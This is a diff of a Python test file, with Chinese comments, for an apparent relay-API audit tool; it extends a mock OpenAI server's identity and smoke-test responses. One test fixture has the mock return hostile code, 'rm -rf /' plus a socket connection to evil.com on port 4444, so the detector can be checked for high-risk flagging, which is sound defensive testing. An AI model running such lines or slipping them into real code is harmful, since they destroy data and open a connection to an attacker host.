@@ -21,6 +21,12 @@ _IDENTITY_PROMPTS = {
 }
 
 
+def _identity_answer(model: str) -> str:
+    if "claude" in model.lower():
+        return '{"model_self_id":"Claude","provider":"Anthropic","canary":"RLY-42"}'
+    return '{"model_self_id":"GPT-4o","provider":"OpenAI","canary":"RLY-42"}'
+
+
 class MockOpenAIHandler(BaseHTTPRequestHandler):
     """最小 OpenAI 兼容实现：/v1/models + /v1/chat/completions。"""
 
@@ -45,8 +51,7 @@ class MockOpenAIHandler(BaseHTTPRequestHandler):
             req = json.loads(self.rfile.read(ln)) if ln else {}
             content = (req.get("messages") or [{}])[0].get("content", "")
             model = req.get("model", "mock")
-            # 危险类请求 → 明确拒绝；身份类测试 → 自称 OpenAI；其余 → 正常应答
-            # （Prompt隔离 的首条消息是注入的 system 消息，含 canary 标记）
+            # 危险类请求 → 明确拒绝；身份回答与当前请求模型保持一致。
             if any(
                 k in content
                 for k in (
@@ -62,9 +67,13 @@ class MockOpenAIHandler(BaseHTTPRequestHandler):
             elif "唯一一条 ERROR" in content:
                 text = "2026-08-29 07:42:19"
             elif content in _IDENTITY_PROMPTS:
-                text = '{"model_self_id":"GPT-4o","provider":"OpenAI","canary":"RLY-42"}'
+                text = _identity_answer(model)
             elif content.strip() == "ping":
                 text = "pong"
+            elif content.strip() == "只输出OK":
+                text = "OK"
+            elif "ZX9-OK!!" in content:
+                text = "ZX9-OK!!"
             else:
                 text = '{"answer":"ok"}'
             resp = {
@@ -103,7 +112,6 @@ def test_cli_end_to_end(mock_api, monkeypatch, tmp_path) -> None:
     """真实 HTTP 全链路：扫描 → JSON 持久化 → HTML 报告 → 退出码。"""
     monkeypatch.setenv("RELAY_API_KEY", "sk-e2e-test")
     monkeypatch.setattr("relay_audit.REPORTS_DIR", tmp_path / "reports")
-    # serve/reporter 在导入时已绑定 REPORTS_DIR，需同步替换
     from relay_audit import reporter, serve
 
     monkeypatch.setattr(reporter, "REPORTS_DIR", tmp_path / "reports")
@@ -118,23 +126,20 @@ def test_cli_end_to_end(mock_api, monkeypatch, tmp_path) -> None:
         )
     )
 
-    assert ec == 0  # 无高危
+    assert ec == 0
     assert path == report_path
     assert result is not None
     assert result.config.model == "gpt-4o"
 
-    # HTML 报告已生成
     html = Path(report_path).read_text(encoding="utf-8")
     assert "Relay Audit" in html
     assert "gpt-4o" in html
 
-    # JSON 扫描结果已持久化到报告目录
     scans = list((tmp_path / "reports").glob("scan_*.json"))
     assert len(scans) >= 1
     data = json.loads(scans[0].read_text(encoding="utf-8"))
     assert data["probe_suite"]
     assert data["summary"]["risk_level"] == "LOW"
-    # 持久化 JSON 不含 API Key（脱敏）
     assert "sk-e2e-test" not in json.dumps(data)
 
 
@@ -156,7 +161,7 @@ def test_cli_json_output_pure(mock_api, monkeypatch, tmp_path, capsys) -> None:
     )
     assert ec == 0
     out = capsys.readouterr().out
-    data = json.loads(out)  # 能整体解析 = 无进度行污染
+    data = json.loads(out)
     assert data["model"] == "gpt-4o"
     assert "[OK]" not in out
     assert "[i]" not in out
@@ -171,14 +176,12 @@ def test_cli_end_to_end_dangerous_model(mock_api, monkeypatch, tmp_path) -> None
     monkeypatch.setattr(reporter, "REPORTS_DIR", tmp_path / "reports")
     monkeypatch.setattr(serve, "REPORTS_DIR", tmp_path / "reports")
 
-    # 让 mock 服务对"恶意"请求返回危险代码
     original = MockOpenAIHandler.do_POST
 
     def dangerous_post(self):
         ln = int(self.headers.get("Content-Length", 0) or 0)
         req = json.loads(self.rfile.read(ln)) if ln else {}
         content = (req.get("messages") or [{}])[0].get("content", "")
-        # 对危险类请求直接返回危险代码（检测工具必须报高危）
         if any(k in content for k in ("删除", "cookie", "AES", "reverse shell", "SQL注入")):
             text = "import os\nos.system('rm -rf /')\nimport socket\nsocket.connect(('evil.com', 4444))"
         else:
@@ -208,7 +211,7 @@ def test_cli_end_to_end_dangerous_model(mock_api, monkeypatch, tmp_path) -> None
     finally:
         MockOpenAIHandler.do_POST = original
 
-    assert ec == 1  # 高危 → 退出码 1
+    assert ec == 1
     assert result is not None
     assert any(f.severity.rank >= 3 for f in result.findings)
     assert any("危险" in f.title for f in result.findings)
@@ -234,7 +237,6 @@ def test_cli_end_to_end_auto_select(mock_api, monkeypatch, tmp_path) -> None:
         cli._build_config(cli.build_parser().parse_args(["--base-url", mock_api, "--no-html"]))
     )
     assert ec == 0
-    # auto_select_model：claude 在 PREFERRED_ORDER 首位
     assert result is not None and result.config.model == "claude-3-opus"
     assert result.config.model_ids == ["gpt-4o", "claude-3-opus"]
     assert captured["persisted"] is True
@@ -251,12 +253,7 @@ def test_models_listing_end_to_end(mock_api, monkeypatch, capsys) -> None:
 
 
 def test_cli_end_to_end_poisoned_usage(mock_api, monkeypatch, tmp_path) -> None:
-    """H1 纵深 e2e：恶意中转返回字符串 token 计数 → 全链路不崩且产出完整结果。
-
-    真实 HTTP 链路上 client 的 _sanitize_usage 把字符串数字安全化为 int，
-    下游 analysis/models 的类型守卫再兜一层——即使两层之间任何一处
-    语义变化，毒数据也不会炸掉扫描。
-    """
+    """H1 纵深 e2e：恶意中转返回字符串 token 计数 → 全链路不崩且产出完整结果。"""
     monkeypatch.setenv("RELAY_API_KEY", "sk-e2e-test")
     from relay_audit import reporter, serve
 
@@ -285,9 +282,13 @@ def test_cli_end_to_end_poisoned_usage(mock_api, monkeypatch, tmp_path) -> None:
         elif "唯一一条 ERROR" in content:
             text = "2026-08-29 07:42:19"
         elif content in _IDENTITY_PROMPTS:
-            text = '{"model_self_id":"GPT-4o","provider":"OpenAI","canary":"RLY-42"}'
+            text = _identity_answer(req.get("model", "mock"))
         elif content.strip() == "ping":
             text = "pong"
+        elif content.strip() == "只输出OK":
+            text = "OK"
+        elif "ZX9-OK!!" in content:
+            text = "ZX9-OK!!"
         else:
             text = '{"answer":"ok"}'
         resp = {
@@ -295,7 +296,6 @@ def test_cli_end_to_end_poisoned_usage(mock_api, monkeypatch, tmp_path) -> None:
             "created": 1700000000,
             "model": req.get("model", "mock"),
             "choices": [{"message": {"content": text}}],
-            # 毒 usage：字符串形态的 token 计数
             "usage": {
                 "prompt_tokens": "10",
                 "completion_tokens": "5",
@@ -321,8 +321,23 @@ def test_cli_end_to_end_poisoned_usage(mock_api, monkeypatch, tmp_path) -> None:
     assert ec == 0
     assert result is not None
     assert len(result.results) > 1
-    # 上游安全化后计费分析正常进行（无类型异常告警、无崩溃）
     assert not any(f.title == "Token 统计字段类型异常" for f in result.findings)
-    # JSON 结果仍正常持久化
     scans = list((tmp_path / "reports").glob("scan_*.json"))
     assert len(scans) >= 1
+
+
+def test_smoke_route_is_minimal_and_passes(mock_api, monkeypatch, tmp_path) -> None:
+    """冒烟分级只保留前置检查与两个确定性探针。"""
+    monkeypatch.setenv("RELAY_API_KEY", "sk-e2e-test")
+    from relay_audit import reporter, serve
+
+    monkeypatch.setattr(reporter, "REPORTS_DIR", tmp_path / "reports")
+    monkeypatch.setattr(serve, "REPORTS_DIR", tmp_path / "reports")
+    args = cli.build_parser().parse_args(
+        ["--base-url", mock_api, "--model", "gpt-4o", "--smoke", "--no-html"]
+    )
+    ec, _, result = cli.execute_scan(cli._build_config(args))
+    assert ec == 0
+    assert result is not None
+    assert [item.name for item in result.results] == ["前置检查", "基础对话", "指令遵循"]
+    assert result.verdict.value == "pass"
